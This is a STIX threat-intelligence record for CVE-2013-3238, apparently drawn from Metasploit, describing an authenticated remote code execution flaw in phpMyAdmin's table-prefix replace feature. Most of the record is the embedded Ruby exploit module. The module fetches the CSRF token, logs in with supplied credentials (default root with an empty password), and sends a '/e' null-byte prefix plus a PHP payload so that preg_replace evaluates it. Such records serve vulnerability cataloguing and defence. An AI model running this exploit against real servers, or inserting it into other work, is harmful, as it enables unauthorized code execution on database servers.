{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3c910f4d-4a59-4d93-b8f7-06f8dadee715",
    "created": "2024-08-14T17:09:00.009032Z",
    "modified": "2024-08-14T17:09:00.009036Z",
    "name": "phpMyAdmin Authenticated Remote Code Execution via preg_replace()",
    "description": " This module exploits a PREG_REPLACE_EVAL vulnerability in phpMyAdmin's replace_prefix_tbl within libraries/mult_submits.inc.php via db_settings.php This affects versions 3.5.x < 3.5.8.1 and 4.0.0 < 4.0.0-rc3. PHP versions > 5.4.6 are not vulnerable. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/phpmyadmin_preg_replace.rb",
            "external_id": "phpmyadmin_preg_replace.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3238"
        },
        {
            "source_name": "reference",
            "url": "http://www.waraxe.us/advisory-103.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.phpmyadmin.net/home_page/security/PMASA-2013-2.php"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'phpMyAdmin Authenticated Remote Code Execution via preg_replace()',\n      'Description' => %q{\n          This module exploits a PREG_REPLACE_EVAL vulnerability in phpMyAdmin's\n          replace_prefix_tbl within libraries/mult_submits.inc.php via db_settings.php\n          This affects versions 3.5.x < 3.5.8.1 and 4.0.0 < 4.0.0-rc3.\n          PHP versions > 5.4.6 are not vulnerable.\n      },\n      'Author' =>\n        [\n          'Janek \"waraxe\" Vind', # Discovery\n          'Ben Campbell' # Metasploit Module\n        ],\n      'License' => MSF_LICENSE,\n      'Notes' => {\n        'Stability' => [CRASH_SAFE],\n        'SideEffects' => [],\n        'Reliability' => []\n      },\n      'References' =>\n        [\n          [ 'CVE', '2013-3238' ],\n          [ 'EDB', '25003'],\n          [ 'OSVDB', '92793'],\n          [ 'URL', 'http://www.waraxe.us/advisory-103.html' ],\n          [ 'URL', 'http://www.phpmyadmin.net/home_page/security/PMASA-2013-2.php' ]\n        ],\n      'Privileged' => false,\n      'Platform'   => ['php'],\n      'Arch'       => ARCH_PHP,\n      'Payload'    =>\n        {\n          'BadChars' => \"&\\n=+%\",\n          # Clear out PMA's error handler so it doesn't lose its mind\n          # and cause ENOMEM errors and segfaults in the destructor.\n          'Prepend' => \"function foo($a,$b,$c,$d,$e){return true;};set_error_handler(foo);\"\n        },\n      'Targets' =>\n        [\n          [ 'Automatic', { } ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2013-04-25'))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, \"Base phpMyAdmin directory path\", '/phpmyadmin/']),\n        OptString.new('USERNAME', [ true, \"Username to authenticate with\", 'root']),\n        OptString.new('PASSWORD', [ false, \"Password to authenticate with\", ''])\n      ])\n  end\n\n  def check\n    begin\n      res = send_request_cgi({ 'uri' => normalize_uri(target_uri.path, '/js/messages.php') })\n    rescue\n      vprint_error(\"Unable to connect to server.\")\n      return CheckCode::Unknown\n    end\n\n    if res.code != 200\n      vprint_error(\"Unable to query /js/messages.php\")\n      return CheckCode::Unknown\n    end\n\n    php_version = res['X-Powered-By']\n    if php_version\n      vprint_status(\"PHP Version: #{php_version}\")\n      if php_version =~ /PHP\\/(\\d)\\.(\\d)\\.(\\d)/\n        if $1.to_i > 5\n          return CheckCode::Safe\n        else\n          if $1.to_i == 5 and $2.to_i > 4\n            return CheckCode::Safe\n          else\n            if $1.to_i == 5 and $2.to_i == 4 and $3.to_i > 6\n              return CheckCode::Safe\n            end\n          end\n        end\n      end\n    else\n      vprint_status(\"Unknown PHP Version\")\n    end\n\n    if res.body =~ /pmaversion = '(.*)';/\n      print_status(\"phpMyAdmin version: #{$1}\")\n      case $1.downcase\n        when '3.5.8.1', '4.0.0-rc3'\n          return CheckCode::Safe\n        when '4.0.0-alpha1', '4.0.0-alpha2', '4.0.0-beta1', '4.0.0-beta2', '4.0.0-beta3', '4.0.0-rc1', '4.0.0-rc2'\n          return CheckCode::Appears\n        else\n          if $1.starts_with? '3.5.'\n            return CheckCode::Appears\n          end\n\n          return CheckCode::Detected\n      end\n    end\n\n    CheckCode::Safe\n  end\n\n  def exploit\n    # Always display target info\n    print_status(check[1])\n\n    uri = target_uri.path\n    print_status(\"Grabbing CSRF token...\")\n    response = send_request_cgi({ 'uri' => uri})\n    if response.nil?\n      fail_with(Failure::NotFound, \"Failed to retrieve webpage.\")\n    end\n\n    if (response.body !~ /\"token\"\\s*value=\"([^\"]*)\"/)\n      fail_with(Failure::NotFound, \"Couldn't find token. Is URI set correctly?\")\n    else\n      print_good(\"Retrieved token\")\n    end\n\n    token = $1\n    post = {\n      'token' => token,\n      'pma_username' => datastore['USERNAME'],\n      'pma_password' => datastore['PASSWORD']\n    }\n\n    print_status(\"Authenticating...\")\n\n    login = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(uri, 'index.php'),\n      'vars_post' => post\n    })\n\n    if login.nil?\n      fail_with(Failure::NotFound, \"Failed to retrieve webpage.\")\n    end\n\n    if login.redirect?\n      token = login.redirection.to_s.scan(/token=(.*)[&|$]/).flatten.first\n    else\n      fail_with(Failure::NotFound, \"Couldn't find token. Wrong PMA version?\")\n    end\n\n    cookies = login.get_cookies\n\n    login_check = send_request_cgi({\n      'uri' => normalize_uri(uri, 'index.php'),\n      'vars_get' => { 'token' => token },\n      'cookie' => cookies\n    })\n\n    if login_check.body =~ /Welcome to/\n      fail_with(Failure::NoAccess, \"Authentication failed\")\n    else\n      print_good(\"Authentication successful\")\n    end\n\n    db = rand_text_alpha(3+rand(3))\n    send_request_cgi({\n      'uri'\t=> normalize_uri(uri, 'db_structure.php'),\n      'method' => 'POST',\n      'cookie' => cookies,\n      'vars_post' => {\n        'query_type' => 'replace_prefix_tbl',\n        'db' => db,\n        'selected[0]' => db,\n        'token' => token,\n        'from_prefix' => \"/e\\0\",\n        'to_prefix' => payload.encoded,\n        'mult_btn' => 'Yes'\n      }\n    },1)\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-04-25",
    "x_mitre_platforms": [
        "['php']"
    ]
}